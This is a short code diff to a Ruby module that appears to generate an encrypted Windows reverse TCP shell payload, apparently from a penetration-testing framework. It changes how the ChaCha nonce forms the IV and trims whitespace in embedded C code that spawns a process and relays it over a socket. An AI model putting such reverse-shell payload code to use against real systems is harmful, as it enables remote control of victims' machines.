@@ -30,8 +30,7 @@ module Payload::Windows::EncryptedReverseTcp
 
   def generate(opts={})
     opts[:uuid] ||= generate_payload_uuid.puid_hex
-    block_count = "\x01\x00\x00\x00"
-    iv = block_count + datastore['ChachaNonce']
+    iv = datastore['ChachaNonce']
 
     conf =
     {
@@ -122,7 +121,7 @@ module Payload::Windows::EncryptedReverseTcp
       key = conf['ChachaKey']
       nonce = conf['ChachaNonce']
     end
-    iv = "\x01\x00\x00\x00" + nonce
+    iv = nonce
 
     link_script = module_info['DefaultOptions']['LinkerScript']
     comp_opts =
@@ -531,7 +530,7 @@ module Payload::Windows::EncryptedReverseTcp
    end
 
   def single_comm
-    %Q^  
+    %Q^
         HANDLE *comm_handles = init_process(conn_socket);
         communicate(*(comm_handles), *(comm_handles+1), conn_socket);
 
@@ -597,7 +596,7 @@ module Payload::Windows::EncryptedReverseTcp
 
        HANDLE *comm_handles = init_process(conn_socket);
        communicate(*(comm_handles), *(comm_handles+1), conn_socket);
-     } 
+     }
     ^
   end
 end
